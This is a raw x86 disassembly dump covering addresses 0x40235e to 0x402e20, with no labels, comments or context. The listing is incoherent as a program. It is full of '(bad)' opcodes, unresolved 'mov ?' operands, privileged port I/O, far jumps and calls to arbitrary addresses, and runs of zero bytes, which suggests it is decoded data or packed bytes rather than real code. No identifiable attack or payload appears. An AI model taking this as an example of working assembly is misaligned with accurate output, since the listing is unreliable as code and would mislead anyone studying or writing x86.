  40235e:	mov    ebx,ds
  402360:	sbb    al,BYTE PTR [ecx]
  402362:	test   DWORD PTR [ebx],eax
  402364:	test   esp,ebx
  402366:	in     al,dx
  402367:	sbb    al,0xff
  402369:	imul   ecx,DWORD PTR [ebx+ebx*8-0x17722b12],0xe88c5989
  402374:	jne    0x40233e
  402376:	pop    esp
  402377:	in     eax,0xeb
  402379:	sbb    al,0x84
  40237b:	cld    
  40237c:	mov    edi,0x75e88830
  402381:	and    BYTE PTR [ebp-0x63b30792],ah
  402387:	or     ebx,DWORD PTR cs:[esp+eax*4]
  40238b:	call   0xd2ecbc05
  402390:	jmp    0x4023ae
  402392:	test   al,ch
  402394:	jne    0x4023aa
  402396:	pushf  
  402397:	sar    dl,cl
  402399:	xor    DWORD PTR [ebp-0x7bdb3d46],0x4e
  4023a0:	mov    eax,DWORD PTR [eax-0x301740ff]
  4023a6:	cwde   
  4023a7:	int3   
  4023a8:	(bad)  
  4023a9:	(bad)  
  4023ab:	push   ebx
  4023ac:	call   ecx
  4023ae:	mov    ebx,ebx
  4023b0:	retf   0x8440
  4023b3:	add    eax,DWORD PTR [ebp-0x488452a4]
  4023b9:	sbb    al,0x5b
  4023bb:	jmp    0x4023c3
	...
  4023e4:	add    BYTE PTR [eax],al
  4023e6:	cmp    ecx,DWORD PTR [eax]
  4023e8:	icebp  
  4023e9:	fist   DWORD PTR [esi-0x6a17a96d]
  4023ef:	sbb    BYTE PTR [ebp-0x18],dl
  4023f2:	test   eax,0x778518e
  4023f7:	pop    ebx
  4023f8:	jmp    0x6d9df7f9
  4023fd:	xchg   DWORD PTR [ebx+ebx*2],ebx
  402400:	jmp    0x26cb7d7f
  402405:	outs   dx,BYTE PTR ds:[esi]
  402406:	lock cmp BYTE PTR [ebx+0x4],0x1d
  40240b:	pop    ebx
  40240c:	push   0xffffffbf
  40240e:	and    BYTE PTR [eax-0x17],bl
  402411:	add    ecx,DWORD PTR [ebx+ebx*2-0x67]
  402415:	fild   DWORD PTR [ebp-0x5afc16a6]
  40241b:	pop    ss
  40241c:	add    eax,0x18751e8
  402421:	push   0x82e95c1f
  402426:	loopne 0x40247e
  402428:	in     al,0x3
  40242a:	sbb    al,0x6b
  40242c:	jmp    0xea2ad884
  402431:	add    ebx,DWORD PTR [esp+eiz*8]
  402434:	sub    al,0xdc
  402436:	push   es
  402437:	pop    ebx
  402438:	mov    esi,0x3c8d8071
  40243d:	lock mov eax,DWORD PTR [edi]
  402440:	shl    edi,0x9
  402443:	mov    edx,DWORD PTR [ecx-0x16a3e0a3]
  402449:	add    BYTE PTR [eax],0x0
	...
  402470:	add    BYTE PTR [eax],al
  402472:	add    BYTE PTR [eax+0x66],bl
  402475:	pusha  
  402476:	inc    ecx
  402477:	lea    edx,fs:[eax+ebp*8]
  40247b:	je     0x4024c2
  40247d:	xchg   edx,eax
  40247e:	add    al,0x1c
  402480:	mov    ?,esp
  402482:	sti    
  402483:	cmp    eax,esp
  402485:	add    BYTE PTR [ebx+0x43],dh
  402488:	lea    ebp,[edx-0x1f]
  40248b:	out    0x4d,eax
  40248d:	dec    eax
  40248e:	test   al,0x1f
  402490:	mov    ?,WORD PTR [ebp-0xf]
  402493:	push   edi
  402494:	push   esi
  402495:	std    
  402496:	push   esi
  402497:	inc    ebx
  402498:	popa   
  402499:	fmul   DWORD PTR [esi-0x53]
  40249c:	xchg   bh,bh
  40249e:	mov    esp,0x3de27517
  4024a3:	sti    
  4024a4:	mov    WORD PTR [ebx],fs
  4024a6:	adc    DWORD PTR [ebx],eax
  4024a8:	pop    es
  4024a9:	clc    
  4024aa:	lea    eax,cs:[ebx+0x74f79cff]
  4024b1:	or     BYTE PTR [ebx+edi*8],bl
  4024b4:	mov    WORD PTR [ebx],fs
  4024b6:	xor    DWORD PTR [ebx],eax
  4024b8:	pop    es
  4024b9:	in     al,dx
  4024ba:	add    DWORD PTR [ebx],edx
  4024bc:	pop    ebx
  4024bd:	add    cl,ch
  4024bf:	ret    0xe806
  4024c2:	adc    ebx,ecx
  4024c4:	mov    edi,?
  4024c6:	jmp    0x1482b8d
  4024cb:	leave  
  4024cc:	xchg   edx,eax
  4024cd:	jmp    esi
  4024cf:	ss cwde 
  4024d1:	pop    ebx
  4024d2:	mov    al,0xdd
  4024d4:	push   edi
  4024d5:	add    BYTE PTR [eax+eax*1],bh
	...
  402500:	daa    
  402501:	jg     0x402486
  402503:	dec    esp
  402504:	mov    al,ds:0x82f1738c
  402509:	push   es
  40250a:	or     cl,dl
  40250c:	bound  eax,QWORD PTR [ecx-0x64d91700]
  402512:	leave  
  402513:	stos   DWORD PTR es:[edi],eax
  402514:	or     DWORD PTR [esp+edx*2+0x45e05372],0xfffffff1
  40251c:	sbb    al,0xdb
  40251e:	add    cl,ch
  402520:	pop    ds
  402521:	sub    ebp,DWORD PTR [edx+0x29]
  402524:	inc    eax
  402525:	xchg   edi,eax
  402526:	jmp    0x39c2:0xc9584500
  40252d:	pop    eax
  40252e:	push   ebp
  40252f:	mov    esp,DWORD PTR [ecx+0x308bfc1d]
  402535:	nop
  402536:	mov    cl,BYTE PTR [ebp+0x31]
  402539:	jns    0x402549
  40253b:	push   ecx
  40253c:	add    al,0xaf
  40253e:	add    ch,BYTE PTR [ebx]
  402540:	cmc    
  402541:	mov    BYTE PTR [ebx+0x376b659],ch
  402547:	repz scas eax,DWORD PTR es:[edi]
  402549:	adc    al,0xc9
  40254b:	ret    0x580d
  40254e:	push   ebp
  40254f:	mov    esp,DWORD PTR [ecx+0x1e]
  402552:	push   edi
  402553:	mov    esi,DWORD PTR [eax-0x6774047d]
  402559:	(bad)
  40255d:	js     0x402561
  40255f:	repz pop ecx
  402561:	adc    eax,0xc95e
	...
  40258a:	add    BYTE PTR [eax],al
  40258c:	add    BYTE PTR [edi],dh
  40258e:	test   bh,bh
  402590:	push   esp
  402591:	dec    esi
  402592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402593:	push   esi
  402594:	push   edi
  402595:	dec    esi
  402596:	or     ecx,DWORD PTR [eax]
  402598:	cld    
  402599:	ds push ebx
  40259b:	adc    BYTE PTR [ebx],ch
  40259d:	cmc    
  40259e:	adc    BYTE PTR [ebp+0xc],bh
  4025a1:	out    0x58,al
  4025a3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025a5:	scas   al,BYTE PTR es:[edi]
  4025a6:	shl    BYTE PTR [ebp+0x1],1
  4025a9:	cmc    
  4025aa:	adc    eax,0x9277c95e
  4025af:	call   DWORD PTR [esi+ecx*1-0x4d]
  4025b3:	add    esp,0xffffffd1
  4025b6:	sbb    al,0x57
  4025b8:	push   ebx
  4025b9:	fstp   QWORD PTR [eax+0x1]
  4025bc:	add    BYTE PTR [ebp+0x76],dh
  4025bf:	jne    0x4025c9
  4025c1:	(bad)  
  4025c2:	out    0xff,eax
  4025c4:	call   DWORD PTR [edx+0x1c087d11]
  4025ca:	cmp    eax,0x2a4e2b3d
  4025cf:	add    al,0x1
  4025d1:	sbb    al,0x82
  4025d3:	jnp    0x4025e9
  4025d5:	push   ss
  4025d6:	or     al,0xc2
  4025d8:	loop   0x40261f
  4025da:	clc    
  4025db:	data16 or bl,bl
  4025de:	xor    al,0x79
  4025e0:	jne    0x40260a
  4025e2:	cmp    al,0x3f
  4025e4:	(bad)  
  4025e5:	sbb    al,0x69
  4025e7:	mov    ebx,0xfff7472b
  4025ec:	cmp    dl,BYTE PTR [esi+esi*4+0xe4]
	...
  402617:	add    BYTE PTR [eax],al
  402619:	add    BYTE PTR [ecx+0x22],ah
  40261c:	jp     0x402622
  40261e:	dec    ebp
  40261f:	je     0x40265f
  402621:	(bad)  
  402622:	sbb    ecx,DWORD PTR [edx]
  402624:	dec    edi
  402625:	(bad)  
  402626:	xchg   esi,eax
  402627:	sub    BYTE PTR [ecx],0x88
  40262a:	and    BYTE PTR [ebp+0x79],bh
  40262d:	inc    ebp
  40262e:	repz or al,0x0
  402631:	cmp    bl,BYTE PTR [ebp-0x53]
  402634:	adc    BYTE PTR ss:[esi+0x76],ch
  402638:	sbb    cl,cl
  40263a:	fidiv  DWORD PTR ds:0xe977d56f
  402640:	inc    ebp
  402641:	leave  
  402642:	fiadd  WORD PTR [eax-0x7768aafd]
  402648:	add    ah,0xb4
  40264b:	inc    ebp
  40264c:	dec    esi
  40264d:	push   edi
  40264e:	mov    bl,0x2f
  402650:	cld    
  402651:	pop    edx
  402652:	xchg   esi,eax
  402653:	jne    0x4026d0
  402655:	inc    ebp
  402656:	mov    eax,ds:0xa4013ffe
  40265b:	aaa    
  40265c:	call   0x3d81bdec
  402661:	mov    edx,DWORD PTR [ecx]
  402663:	cmp    BYTE PTR [ebp+eax*2+0x37484],0x1c
  40266b:	pop    ebx
  40266c:	jb     0x4026a4
  40266e:	or     al,0x7e
  402670:	sub    esi,esp
  402672:	loope  0x4025fb
  402674:	out    0xad,al
  402676:	fld    DWORD PTR [edi+0x4330adde]
  40267c:	jno    0x4026cc
	...
  4026a6:	add    BYTE PTR [ebx+0x5b],dl
  4026a9:	adc    al,0xe8
  4026ab:	sbb    edx,ecx
  4026ad:	sub    al,0xe8
  4026af:	xchg   esi,eax
  4026b0:	outs   dx,DWORD PTR ds:[esi]
  4026b1:	mov    cl,0x7b
  4026b3:	ror    DWORD PTR [eax-0x7826520a],1
  4026b9:	jno    0x4026ca
  4026bb:	in     al,0x59
  4026bd:	lahf   
  4026be:	ds and ch,dl
  4026c1:	mov    ah,0xe4
  4026c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c4:	outs   dx,BYTE PTR ds:[esi]
  4026c5:	add    DWORD PTR [edx+0x69],edi
  4026c8:	mov    ch,bl
  4026ca:	dec    esi
  4026cb:	or     dl,ch
  4026cd:	(bad)  [ecx]
  4026cf:	xchg   edi,eax
  4026d0:	pop    ds
  4026d1:	xor    DWORD PTR [ebx],esi
  4026d3:	adc    BYTE PTR [ebx+0x26],cl
  4026d6:	ds hlt 
  4026d8:	jl     0x402703
  4026da:	jns    0x40273d
  4026dc:	mov    BYTE PTR [ecx+0x0],ah
  4026df:	xchg   esi,eax
  4026e0:	pop    ds
  4026e1:	or     eax,0xa65c5f7b
  4026e6:	inc    ebp
  4026e7:	ja     0x40267d
  4026e9:	sub    esi,edi
  4026eb:	retf   
  4026ec:	cs (bad) 
  4026ee:	xlat   BYTE PTR ds:[ebx]
  4026ef:	popf   
  4026f0:	sahf   
  4026f1:	std    
  4026f2:	in     al,0xbb
  4026f4:	mov    DWORD PTR [edx],edi
  4026f6:	das    
  4026f7:	xlat   BYTE PTR ds:[ebx]
  4026f8:	xlat   BYTE PTR ds:[ebx]
  4026f9:	and    al,0xe0
  4026fb:	dec    esp
  4026fc:	mov    bl,BYTE PTR [esp+ecx*1-0x4c]
  402700:	movnti DWORD PTR [esp+ebx*1],eax
  402704:	loopne 0x4026af
  402706:	adc    esp,DWORD PTR [eax+esi*8+0x3e9]
	...
  402731:	add    BYTE PTR [eax],al
  402733:	add    BYTE PTR [edx+ecx*4],bl
  402736:	add    BYTE PTR [eax+edx*1],bh
  402739:	jae    0x402780
  40273b:	mov    bh,0x7f
  40273d:	mov    DWORD PTR [ecx+0x7589542c],ecx
  402743:	popf   
  402744:	js     0x40278a
  402746:	jmp    0xc0964734
  40274b:	adc    eax,0x7945d3bf
  402750:	aas    
  402751:	pmuludq mm2,QWORD PTR [ecx+0x76ff88b6]
  402758:	xchg   ecx,eax
  402759:	pop    ds
  40275a:	clc    
  40275b:	outs   dx,BYTE PTR ds:[esi]
  40275c:	aad    0x8e
  40275e:	(bad)  
  40275f:	fcom   QWORD PTR [edi-0x77]
  402762:	jne    0x4027bd
  402764:	cmp    dh,dl
  402766:	(bad)  
  402767:	push   esi
  402768:	aas    
  402769:	mov    DWORD PTR [ebp+0x4d],esi
  40276c:	or     BYTE PTR [ecx+ebp*8-0x17],ah
  402770:	pop    ds
  402771:	mov    BYTE PTR [ebp-0x13],dh
  402774:	neg    DWORD PTR [edi-0x17]
  402777:	jmp    0xb53f529b
  40277c:	sub    edx,esi
  40277e:	test   DWORD PTR [edi],edx
  402780:	dec    BYTE PTR [eax-0x41084601]
  402786:	(bad)  
  402787:	push   ss
  402788:	dec    DWORD PTR [eax+0xebf1575]
  40278e:	clc    
  40278f:	je     0x402736
  402791:	jns    0x402791
  402793:	(bad)  
  402794:	mov    esi,0xf7e82b
	...
  4027c1:	mov    ebp,0x54eeff88
  4027c6:	push   ebx
  4027c7:	call   0xffc8f820
  4027cc:	push   ebx
  4027cd:	sbb    bl,dh
  4027cf:	dec    ecx
  4027d0:	and    DWORD PTR [ecx+0x5b],ebx
  4027d3:	call   DWORD PTR [eax+ebp*1+0x73]
  4027d7:	mov    ebx,0xff7d5f00
  4027dc:	or     edi,DWORD PTR [ebp-0x350b8a83]
  4027e2:	and    edi,eax
  4027e4:	push   DWORD PTR [eax]
  4027e6:	push   edi
  4027e7:	call   0xffbde797
  4027ec:	and    ebx,DWORD PTR [ebp+0x7d]
  4027ef:	jne    0x4027e9
  4027f1:	popf   
  4027f2:	leave  
  4027f3:	std    
  4027f4:	jmp    FWORD PTR [edx-0x52f78a83]
  4027fa:	mov    ebx,0xd8cafff7
  4027ff:	ret    
  402800:	pop    ebx
  402801:	jl     0x4027a1
  402803:	or     BYTE PTR [eax],al
  402805:	adc    al,bl
  402807:	in     al,dx
  402808:	add    DWORD PTR [ecx],0xffffffb0
  40280b:	push   edi
  40280c:	mov    eax,DWORD PTR [eax+0x41c00a90]
  402812:	push   edx
  402813:	mov    DWORD PTR [eax],0x5c05
  402819:	cs jl  0x40279f
  40281c:	jge    0x40281b
  40281e:	pop    esi
  40281f:	jne    0x402828
  402821:	(bad)  
  402822:	pop    esp
  402823:	add    al,BYTE PTR [eax]
	...
  40284d:	add    BYTE PTR ds:0xb8830f79,al
  402853:	add    DWORD PTR [ecx],0x75
  402856:	add    ah,dh
  402858:	add    BYTE PTR [ecx],al
  40285a:	cmc    
  40285b:	pop    ebx
  40285c:	jmp    0x402860
  40285e:	fmulp  st(5),st
  402860:	or     edx,0x25bbc
  402866:	cmp    BYTE PTR [ebx],dl
  402868:	cld    
  402869:	push   eax
  40286a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40286b:	cmc    
  40286c:	(bad)  
  40286d:	(bad)  
  40286e:	xor    BYTE PTR [eax-0x1],bl
  402871:	jne    0x402820
  402873:	jae    0x402817
  402875:	jmp    0xc04b842f
  40287a:	sbb    al,0x27
  40287c:	jno    0x40280b
  40287e:	loope  0x402829
  402880:	xor    al,0x6a
  402882:	sbb    al,0xf
  402884:	inc    edi
  402885:	hlt    
  402886:	in     al,dx
  402887:	sub    eax,DWORD PTR [edi+edi*8]
  40288a:	or     DWORD PTR [edx-0x66878a20],esp
  402890:	(bad)
  402894:	or     al,0xc0
  402896:	icebp  
  402897:	xor    eax,0x71647d85
  40289c:	push   edi
  40289d:	inc    esi
  40289e:	lahf   
  40289f:	push   esi
  4028a0:	fadd   DWORD PTR [ecx]
  4028a2:	leave  
  4028a3:	ja     0x402829
  4028a5:	jge    0x4028eb
  4028a7:	jb     0x402900
  4028a9:	cmp    dl,BYTE PTR [edi-0x33bf23ca]
  4028af:	fld    DWORD PTR [edx-0x3]
	...
  4028da:	add    BYTE PTR [ebx],dh
  4028dc:	add    BYTE PTR [ebp-0x24416608],cl
  4028e2:	push   eax
  4028e3:	retf   
  4028e4:	fwait
  4028e5:	add    ebp,DWORD PTR [edx+0x1c]
  4028e8:	adc    eax,0xc8131057
  4028ed:	fucomip st,st(0)
  4028ef:	jae    0x40291c
  4028f1:	add    al,0x0
  4028f3:	pop    ss
  4028f4:	xor    al,0x58
  4028f6:	or     dl,BYTE PTR [ebx+0x1c]
  4028f9:	sub    ebp,edi
  4028fb:	repz cmp eax,0x78f7ff2d
  402901:	mov    WORD PTR [ebp+0x8],es
  402904:	jns    0x4028c9
  402906:	je     0x402929
  402908:	push   ebp
  402909:	push   edi
  40290a:	clc    
  40290b:	mov    ds:0xc875e074,eax
  402910:	ins    BYTE PTR es:[edi],dx
  402911:	sbb    eax,0x8c741ce9
  402916:	(bad)  
  402917:	daa    
  402918:	xor    al,0x57
  40291a:	sbb    al,0x9f
  40291c:	pop    ebx
  40291d:	fs cld 
  40291f:	sbb    eax,0x598cf70a
  402924:	arpl   WORD PTR [ecx],bp
  402926:	xor    al,0x9b
  402928:	adc    ch,dh
  40292a:	loopne 0x402935
  40292c:	imul   eax,esi,0x56
  40292f:	sbb    BYTE PTR [esi+0x3c740c34],al
  402935:	mov    dh,0xe0
  402937:	jnp    0x40295f
  402939:	mov    al,ds:0x3c5b08c5
  40293e:	lea    eax,[eax]
	...
  402968:	js     0x402946
  40296a:	sbb    al,0xc
  40296c:	sbb    eax,0xd183e95b
  402971:	push   ebx
  402972:	mov    ss,WORD PTR [esi]
  402974:	cmp    eax,0x9b042813
  402979:	and    cl,dh
  40297b:	ins    DWORD PTR es:[edi],dx
  40297c:	sbb    al,0x86
  40297e:	cld    
  40297f:	idiv   DWORD PTR [edx]
  402981:	adc    cl,bl
  402983:	loopne 0x40292e
  402985:	push   esi
  402986:	push   si
  402988:	adc    al,0x73
  40298a:	push   ebp
  40298b:	loope  0x4029b0
  40298d:	xchg   BYTE PTR [eax],ah
  40298f:	lds    ebp,FWORD PTR [ebx+ebx*2]
  402992:	add    al,ah
  402994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402995:	stos   BYTE PTR es:[edi],al
  402996:	sbb    ch,ah
  402998:	lds    edx,FWORD PTR [ebx-0x17]
  40299b:	add    ebx,DWORD PTR [esp+ebp*4]
  40299e:	inc    ebx
  40299f:	push   esp
  4029a0:	sub    ah,bl
  4029a2:	cmp    edx,DWORD PTR [edx]
  4029a4:	mov    ?,WORD PTR [ebx+0x6bee8225]
  4029aa:	clc    
  4029ab:	repnz or al,0x79
  4029ae:	pop    es
  4029af:	mov    dh,BYTE PTR [eax]
  4029b1:	loopne 0x40296c
  4029b3:	mov    bl,BYTE PTR [ebp+0x5b]
  4029b6:	pop    es
  4029b7:	ret    
  4029b8:	push   ecx
  4029b9:	mov    eax,ds:0x7697362a
  4029be:	add    BYTE PTR [esi-0x9f7e058],bl
  4029c4:	outs   dx,BYTE PTR ds:[esi]
  4029c5:	sar    DWORD PTR [ebp-0xb],1
  4029c8:	xchg   esi,eax
  4029c9:	pop    ss
  4029ca:	adc    dl,dh
	...
  4029f4:	add    al,dl
  4029f6:	push   cs
  4029f7:	sbb    BYTE PTR [edx-0x30],ah
  4029fa:	fwait
  4029fb:	jmp    0x20c6:0x255e2de1
  402a02:	pop    ebx
  402a03:	add    BYTE PTR [edx+0x14],dh
  402a06:	loopne 0x402a58
  402a08:	pusha  
  402a09:	loope  0x402a65
  402a0b:	xor    ebp,DWORD PTR [ebx-0x61178725]
  402a11:	mov    al,0x25
  402a13:	leave  
  402a14:	stos   DWORD PTR es:[edi],eax
  402a15:	or     al,0x5b
  402a17:	push   ebp
  402a18:	bound  ecx,QWORD PTR [ecx+ebp*1-0x7d]
  402a1c:	or     al,0x20
  402a1e:	pop    ebx
  402a1f:	jne    0x402a0f
  402a21:	bound  ebx,QWORD PTR [edi]
  402a23:	or     BYTE PTR [esi],bh
  402a25:	rcr    BYTE PTR [ebx],1
  402a27:	add    BYTE PTR [edx-0x43],ch
  402a2a:	push   esi
  402a2b:	add    ah,dh
  402a2d:	sbb    bl,BYTE PTR [esi+0x128af545]
  402a33:	inc    ecx
  402a34:	jmp    0x4148397b
  402a39:	adc    DWORD PTR [esi+0x0],edi
  402a3c:	jmp    0xbd3fcde7
  402a41:	sbb    esi,DWORD PTR [ebx+0x7]
  402a44:	inc    esi
  402a45:	sbb    BYTE PTR [ebx+0x3],bl
  402a48:	adc    DWORD PTR [edi+0x28],ebx
  402a4b:	call   0xffc4fe3e
  402a50:	jb     0x4029fa
  402a52:	test   BYTE PTR [ebp-0xf],dh
  402a55:	cs jae 0x402a69
  402a58:	push   cs
	...
  402a81:	add    BYTE PTR [eax],ah
  402a83:	pop    ebx
  402a84:	call   DWORD PTR [ebx+eiz*1-0x2cff17d8]
  402a8b:	jge    0x402a8d
  402a8d:	add    BYTE PTR [esi-0x68],cl
  402a90:	pop    ebx
  402a91:	leave  
  402a92:	pop    es
  402a93:	push   edi
  402a94:	add    BYTE PTR [ebp+0x3e],dl
  402a97:	mov    edx,DWORD PTR [ebx-0x7d]
  402a9a:	inc    eax
  402a9b:	push   edi
  402a9c:	add    BYTE PTR [ebp-0x46],dh
  402a9f:	popf   
  402aa0:	inc    ebp
  402aa1:	or     BYTE PTR [edx+0x6004110],dh
  402aa7:	sti    
  402aa8:	or     eax,DWORD PTR [eax]
  402aaa:	dec    eax
  402aab:	pop    esp
  402aac:	mov    DWORD PTR [ebp+0x71],0x854148e5
  402ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ab4:	jne    0x402abe
  402ab6:	pop    ebp
  402ab7:	mov    ebx,0xd17500e6
  402abc:	fdivr  st,st(7)
  402abe:	or     BYTE PTR [ebx-0x18],ch
  402ac1:	mov    bl,0xab
  402ac3:	pop    eax
  402ac4:	add    BYTE PTR [ebx],al
  402ac6:	lea    ebx,[ecx]
  402ac8:	push   ebx
  402ac9:	call   0x3fcc7c
  402ace:	into   
  402acf:	mov    edi,0x493d75ff
  402ad4:	call   0x98c696
  402ad9:	dec    DWORD PTR [eax+0x54]
  402adc:	push   ebx
  402add:	call   0x40a961
  402ae2:	test   bl,bh
  402ae4:	pop    es
  402ae5:	mov    edi,0x0
	...
  402b0e:	add    BYTE PTR [ebp+0xd74001e],bh
  402b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b15:	jne    0x402b1f
  402b17:	ins    DWORD PTR es:[edi],dx
  402b18:	mov    ch,0xfb
  402b1a:	push   DWORD PTR [edx]
  402b1c:	rol    ebx,1
  402b1e:	pop    ebx
  402b1f:	cmp    al,0x9a
  402b21:	or     BYTE PTR [eax],al
  402b23:	test   al,0xd0
  402b25:	in     al,dx
  402b26:	cmp    DWORD PTR [ecx],0xffffffa4
  402b29:	push   edi
  402b2a:	push   0x4771c
  402b2f:	sbb    al,0x5a
  402b31:	lods   eax,DWORD PTR ds:[esi]
  402b32:	sti    
  402b33:	retf   
  402b34:	pop    esp
  402b35:	mov    WORD PTR [ebp-0x40],es
  402b38:	lock pop ds
  402b3a:	cmc    
  402b3b:	addr16 mov bl,0x3
  402b3e:	add    BYTE PTR [ecx],ch
  402b40:	jo     0x402b2c
  402b42:	push   ss
  402b43:	stos   DWORD PTR es:[edi],eax
  402b44:	es loopne 0x402bb1
  402b47:	sbb    al,0x28
  402b49:	add    al,0xff
  402b4b:	adc    DWORD PTR [edx+0x69],edi
  402b4e:	add    BYTE PTR [ebx-0x22b42972],dl
  402b54:	jno    0x402adc
  402b56:	rol    BYTE PTR ds:0x7875dd4a,0x99
  402b5d:	imul   edi,ebx,0x45c5b473
  402b63:	push   0x1c000371
  402b68:	and    eax,0x71dd4bdb
  402b6d:	call   0x88ccd29f
  402b72:	inc    ebp
	...
  402b9b:	add    BYTE PTR [edi+edx*4],dl
  402b9e:	fdivr  QWORD PTR [edi+0x43]
  402ba1:	add    al,0x1b
  402ba3:	inc    edx
  402ba4:	and    BYTE PTR [edi+0x271c69f8],al
  402baa:	inc    edx
  402bab:	or     ah,cl
  402bad:	test   eax,0x71dd4d46
  402bb2:	fdiv   QWORD PTR [edx]
  402bb4:	add    al,0xc1
  402bb6:	(bad)  
  402bb8:	adc    edi,DWORD PTR [esi-0x3d]
  402bbb:	je     0x402bde
  402bbd:	or     eax,DWORD PTR [edi-0x4]
  402bc0:	test   DWORD PTR [eax+eax*4+0x1cf520c7],0x89626900
  402bcb:	inc    ebp
  402bcc:	call   0xdf0af22c
  402bd1:	push   edi
  402bd2:	jmp    0xbaafd30d
  402bd7:	mov    BYTE PTR [ecx+0x53],bl
  402bda:	loop   0x402b9f
  402bdc:	push   eax
  402bdd:	pop    eax
  402bde:	imul   ebx,DWORD PTR [esp+ebx*1],0x1c9bf308
  402be5:	pop    ebx
  402be6:	jmp    0x2bd482ee
  402beb:	or     BYTE PTR [esi*8-0xae39618],bl
  402bf2:	jmp    0xe9354860
  402bf7:	imul   ebx,DWORD PTR [ebx+ebx*2+0x88b03e9],0xfffffff1
  402bff:	jmp    0x402c01
	...
  402c29:	int3   
  402c2a:	js     0x402c15
  402c2c:	add    esp,DWORD PTR [edi-0x203bfd5d]
  402c32:	push   es
  402c33:	loop   0x402c65
  402c35:	je     0x402be9
  402c37:	mov    WORD PTR [ebx],es
  402c39:	sbb    al,0xc3
  402c3b:	call   0x329b4843
  402c40:	retf   
  402c41:	pop    esi
  402c42:	push   edi
  402c43:	jmp    0x72afc37e
  402c48:	inc    esi
  402c49:	adc    al,0x56
  402c4b:	test   eax,0xb1db2157
  402c50:	add    ebp,DWORD PTR [ecx+0x1c033153]
  402c56:	pop    ebx
  402c57:	jmp    0xe9978b26
  402c5c:	fcom   QWORD PTR [ecx-0x667bead]
  402c62:	pop    edx
  402c63:	jmp    0xbdc230e8
  402c68:	push   cs
  402c69:	mov    ch,0x6a
  402c6b:	jmp    0x924873
  402c70:	pop    esp
  402c71:	fist   WORD PTR [ecx-0x4a]
  402c74:	sub    esp,esi
  402c76:	push   edi
  402c77:	mov    eax,0x5b1fe9
  402c7c:	xor    ch,bl
  402c7e:	push   esi
  402c7f:	add    BYTE PTR [esp+eiz*4-0x14da7c92],bh
  402c86:	hlt    
  402c87:	call   DWORD PTR [edx-0xe8a7de1]
	...
  402cb5:	add    bh,al
  402cb7:	out    0xe5,al
  402cb9:	jmp    0x760082dd
  402cbe:	cmc    
  402cbf:	sub    dl,BYTE PTR [eax-0x2f]
  402cc2:	and    al,BYTE PTR [ebp+0x17a9deff]
  402cc8:	cld    
  402cc9:	xor    DWORD PTR [eax-0x7e],ecx
  402ccc:	jne    0x402c9b
  402cce:	addr16 pop es
  402cd0:	or     cl,dl
  402cd2:	loope  0x402d4b
  402cd4:	add    cl,ch
  402cd6:	sub    bl,BYTE PTR [ebx+0x756e575]
  402cdc:	cld    
  402cdd:	sar    edi,0x84
  402ce0:	jmp    DWORD PTR [esi-0x151464cd]
  402ce6:	stos   BYTE PTR es:[edi],al
  402ce7:	pop    ss
  402ce8:	cld    
  402ce9:	mov    al,ds:0x3400565a
  402cee:	fwait
  402cef:	outs   dx,BYTE PTR ds:[esi]
  402cf0:	push   ebx
  402cf1:	jb     0x402cf8
  402cf3:	dec    edi
  402cf4:	push   0xffffffd9
  402cf6:	bnd jb 0x402d74
  402cf9:	jae    0x402d52
  402cfb:	sub    DWORD PTR [edx-0x17],0xea6a5ab9
  402d02:	mov    cl,0x5a
  402d04:	push   0xffffffea
  402d06:	xchg   DWORD PTR [ebx+0x0],ebx
  402d09:	jmp    0xe1b5adad
  402d0e:	test   DWORD PTR [edi+0x5cf500e4],0x10c50389
  402d18:	pop    esp
  402d19:	push   0x0
	...
  402d43:	add    eax,0x6035e84d
  402d48:	push   edi
  402d49:	add    BYTE PTR [ecx+0x6a58b6],cl
  402d4f:	scas   eax,DWORD PTR es:[edi]
  402d50:	pop    esp
  402d51:	push   0x0
  402d53:	lahf   
  402d54:	push   esi
  402d55:	push   0x0
  402d57:	sbb    ch,BYTE PTR [eax-0x18]
  402d5a:	daa    
  402d5b:	adc    BYTE PTR [edi+0x0],dl
  402d5e:	or     eax,DWORD PTR ds:0x86892f2b
  402d64:	sub    BYTE PTR [ecx+0x0],0x9f
  402d68:	pop    esp
  402d69:	push   0x0
  402d6b:	dec    edi
  402d6c:	pop    ebx
  402d6d:	push   eax
  402d6e:	call   0x40a790
  402d73:	cld    
  402d74:	sbb    BYTE PTR [eax],cl
  402d76:	or     esi,DWORD PTR [ebp+0x46ff242b]
  402d7c:	pop    ebx
  402d7d:	call   0x9c8f3d
  402d82:	push   DWORD PTR [esi+0x74]
  402d85:	mov    ah,0xe4
  402d87:	jne    0x402de5
  402d89:	mov    DWORD PTR [ebx],0xffffa5ba
  402d8f:	scas   al,BYTE PTR es:[edi]
  402d90:	push   ebx
  402d91:	push   DWORD PTR [ebx]
  402d93:	popf   
  402d94:	mov    ebx,0x9d3500e4
  402d99:	add    edi,edi
  402d9b:	call   0x435f:0x852bffa5
  402da2:	or     BYTE PTR [edx],bh
  402da4:	or     eax,eax
  402da6:	pop    ebx
	...
  402dcf:	add    BYTE PTR [esi+edx*4+0x8],bh
  402dd3:	add    BYTE PTR [eax-0x2f],ah
  402dd6:	in     al,dx
  402dd7:	push   ebx
  402dd8:	mov    es,WORD PTR [ebx+0x8]
  402ddb:	sbb    DWORD PTR [ebp*2+0x113374db],0x56
  402de3:	or     ah,dh
  402de5:	arpl   di,bx
  402de7:	add    BYTE PTR [ecx+eax*2],bl
  402dea:	push   esi
  402deb:	add    al,0x4
  402ded:	rcr    bh,0x0
  402df0:	sbb    al,0x31
  402df2:	push   ss
  402df3:	call   0x437c6b
  402df8:	ja     0x402e45
  402dfa:	lds    eax,FWORD PTR [esp+ebx*1]
  402dfd:	mov    edi,0x359dec8e
  402e02:	jecxz  0x402df3
  402e04:	ret    
  402e05:	pop    eax
  402e06:	xor    DWORD PTR [edi-0x61],edx
  402e09:	mov    esi,0x725d4860
  402e0e:	add    esi,DWORD PTR [ecx+edx*1+0x71]
  402e12:	pcmpgtw mm2,QWORD PTR [ebx+esi*1+0x4]
  402e17:	call   0x19a8b9
  402e1c:	pop    ebx
  402e1d:	outs   dx,BYTE PTR ds:[esi]
  402e1e:	pop    esi
  402e1f:	dec    eax
  402e20:	fnsave [ecx+0x3]
